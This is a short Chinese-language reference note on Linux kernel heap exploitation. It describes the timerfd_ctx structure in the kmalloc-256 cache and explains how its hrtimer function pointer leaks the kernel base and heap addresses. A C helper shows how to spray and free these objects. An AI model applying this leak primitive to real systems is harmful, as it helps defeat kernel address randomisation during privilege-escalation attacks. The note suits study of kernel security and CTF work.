# 这里记录比较常用的内核数据结构


# kmalloc-256

## timerfd_ctx
可泄露堆，内核基地址
### 结构体
+ 实际size: 216 bytes
+ 分配标识: GFP_KERNEL

```c
struct timerfd_ctx {
	union {
		struct hrtimer tmr;
		struct alarm alarm;
	} t;
	ktime_t tintv;
	ktime_t moffs;
	wait_queue_head_t wqh;
	u64 ticks;
	int clockid;
	short unsigned expired;
	short unsigned settime_flags;	/* to show in fdinfo */
	struct rcu_head rcu;
	struct list_head clist;
	spinlock_t cancel_lock;
	bool might_cancel;
};
```
### 分配方式
```c
SYSCALL_DEFINE2(timerfd_create, int, clockid, int, flags)
{
    ...
	ctx = kzalloc(sizeof(*ctx), GFP_KERNEL);
    ...
}

```

### 利用方式

其中结构体的`struct hrtimer tmr `这个字段类型的function字段指向的是一个内核函数，因此他可以泄漏内核代码段基地址,经过实际调试，在这个字段中同样也可以泄露内核堆的地址
其中利用方式如下：
```c
void timer_leak() {
    int timefd =  syscall(__NR_timerfd_create, CLOCK_REALTIME, 0);
    struct itimerspec itimerspec;

	itimerspec.it_interval.tv_sec = 0;
	itimerspec.it_interval.tv_nsec = 0;
	itimerspec.it_value.tv_sec = 100;
	itimerspec.it_value.tv_nsec = 0;

	timerfd_settime(timefd, 0, &itimerspec, 0);
	close(timefd);
	sleep(1);
}
